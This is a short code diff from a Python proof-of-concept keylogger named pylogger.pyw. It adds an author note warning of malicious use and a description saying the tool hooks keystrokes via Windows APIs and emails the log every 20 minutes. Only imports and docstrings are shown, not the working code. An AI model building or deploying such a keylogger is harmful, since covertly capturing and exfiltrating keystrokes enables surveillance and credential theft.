@@ -1,3 +1,11 @@
+"""
+Author: Sunggwan Choi 
+Description: A simple PoC userland python keylogger which utilizes SetWindowsHookEx and CallNextHookEx API function. 
+
+Note: The source code will only be public for the duration of the tryout, since it has possibility of malicious usage 
+by malicious users. 
+"""
+
 import PyHook3, pythoncom
 import subprocess
 import time
@@ -13,7 +21,7 @@ import threading
 File: pylogger.pyw
 
 Description: A Proof of Concept python keylogger. Captures keystrokes and sends the log file 
-to an email address every <n> minutes.
+to an email address every <n>(20, by default) minutes.
 
 Features:
     - Keylogging 
